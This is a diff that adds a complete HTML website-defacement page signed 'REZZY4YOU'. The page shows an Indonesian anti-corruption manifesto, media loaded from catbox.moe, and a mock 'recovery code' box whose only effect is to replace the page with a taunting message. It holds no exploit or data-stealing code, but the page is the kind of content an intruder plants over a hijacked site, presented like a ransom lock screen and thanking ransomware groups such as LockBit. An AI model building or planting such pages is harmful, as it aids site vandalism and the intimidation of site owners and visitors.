@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>HACKED BY REZZY4YOU</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Courier New', monospace;
+    }
+    html, body {
+      height: 100%;
+      background: #000;
+      color: #fff;
+      overflow: hidden;
+      text-align: center;
+    }
+    video#bgvid {
+      position: fixed;
+      top: 0;
+      left: 0;
+      min-width: 100%;
+      min-height: 100%;
+      z-index: -1;
+      object-fit: cover;
+      filter: brightness(0.6);
+    }
+    .logo {
+      width: 300px; /* Diperbesar dari 250px */
+      height: 300px; /* Diperbesar dari 250px */
+      border-radius: 50%;
+      margin: 50px auto 20px; /* Margin atas dikurangi sedikit agar tetap seimbang */
+      filter: drop-shadow(0 0 20px red) brightness(1.2); /* Stroke dihapus, efek neon dipertahankan */
+      animation: pulse 2s infinite;
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); filter: drop-shadow(0 0 20px red); }
+      50% { transform: scale(1.05); filter: drop-shadow(0 0 30px red); }
+      100% { transform: scale(1); filter: drop-shadow(0 0 20px red); }
+    }
+    .title {
+      font-size: 32px;
+      color: red;
+      text-shadow: 0 0 10px red;
+    }
+    .hackerby {
+      margin-top: 20px;
+      font-size: 18px;
+      color: #fff;
+    }
+    .quote {
+      margin: 20px auto;
+      font-size: 14px;
+      max-width: 700px;
+      padding: 0 20px;
+      color: #ccc;
+      text-shadow: 0 0 5px #0f0;
+    }
+    .audiocontrol {
+      margin: 30px auto 10px;
+    }
+    audio {
+      width: 180px;
+      height: 28px;
+      filter: drop-shadow(0 0 4px red);
+    }
+    audio::-internal-media-controls-download-button,
+    audio::-webkit-media-controls-enclosure {
+      display: none !important;
+    }
+    audio::-webkit-media-controls-panel {
+      background-color: rgba(0, 0, 0, 0.7);
+    }
+    .bottom-text {
+      margin-top: 20px;
+      color: red;
+      font-size: 16px;
+      animation: blink 1.2s infinite;
+    }
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.4; }
+    }
+    .thanks {
+      margin-top: 20px;
+      font-size: 13px;
+      color: #999;
+    }
+    .thanks span {
+      display: inline-block;
+      margin: 0 5px;
+    }
+    .restore-box {
+      margin-top: 30px;
+    }
+    #codeInput {
+      padding: 10px;
+      font-size: 14px;
+      width: 250px;
+      border: 2px solid red;
+      background: #111;
+      color: #0f0;
+      text-align: center;
+    }
+    #restoreBtn {
+      margin-left: 10px;
+      padding: 10px 20px;
+      background: red;
+      color: white;
+      border: none;
+      cursor: pointer;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body id="defacePage">
+
+  <!-- Background Video -->
+  <video autoplay loop muted id="bgvid">
+    <source src="https://files.catbox.moe/6nztbi.mp4" type="video/mp4">
+  </video>
+
+  <marquee behavior="scroll" direction="left" scrollamount="8" style="color:#0ff; font-size: 28px; font-family: monospace; text-shadow: 0 0 10px #0ff;">
+    DEFACE BY REZZY4YOU 
+  </marquee>
+
+  <!-- Logo -->
+  <img src="https://files.catbox.moe/ll4jvq.png" alt="Rezzy Logo" class="logo">
+
+  <!-- Judul & Hacker -->
+  <div class="title">[ DEFACE BY REZZY4YOU ]</div>
+  <div class="hackerby">[ HACKING BY ] <br> <b style="color: red;">{ REZZY4YOU }</b></div>
+
+  <!-- Quote -->
+  <div class="quote">
+    "Di balik senyum licik, terpendam kegelapan, mereka menari di atas keringat rakyat. Korupsi merajalela, seperti darah yang mengalir dari luka menganga, menjadikan keadilan hilang dalam kabut dusta. Setiap suap menggenggam harapan, menaburkan benih benci di hati kami. Di malam sunyi, tempat-tempat gelap berbisik, “Kami takkan lupa.” Rakyat bangkit, menyalakan api perlawanan, menerangi jalan menuju keadilan."
+  </div>
+
+  <!-- Audio Player -->
+  <div class="audiocontrol">
+    <audio controls>
+      <source src="https://files.catbox.moe/fw4txr.mp3" type="audio/mpeg">
+      Browser kamu tidak mendukung audio player.
+    </audio>
+  </div>
+
+  <!-- Restore Input -->
+  <div class="restore-box">
+    <input type="text" id="codeInput" placeholder="Masukkan kode pemulihan...">
+    <button id="restoreBtn" onclick="restoreDeface()">Pulihkan</button>
+  </div>
+
+  <script>
+    function restoreDeface() {
+      const input = document.getElementById('codeInput').value.trim();
+      if (input === 'SAYA BENCI KORUPTOR') {
+        document.getElementById('defacePage').innerHTML = `
+          <div style="margin-top: 15%; color: #00ff00; text-align: center;">
+            <h1 style="font-size: 38px;"> Sistem Telah Dipulihkan</h1>
+            <p style="margin-top: 20px; font-size: 18px;">
+              Kamu beruntung hari ini...<br>
+              Tapi apakah kamu bisa selamanya aman?<br><br>
+              <i>“Bayangan selalu mengintai... sampai kamu menyalakan cahaya.”</i>
+            </p>
+          </div>`;
+      } else {
+        alert(' Kode salah! Sistem masih terkunci!');
+      }
+    }
+  </script>
+
+  <!-- Bottom text & Thanks -->
+  <div class="bottom-text">Kami hanya sebuah bayangan dalam sistem...</div>
+
+  <div class="thanks">
+    ---- [ THANKS TO ] ----<br>
+    <span>BlackHat</span> •
+    <span>LockBit</span> •
+    <span>Fsociety</span> •
+    <span>BrainCipher</span> •
+    <span>JackTheRipper</span> •
+    <span>Xploit</span>
+  </div>
+
+</body>
+</html>
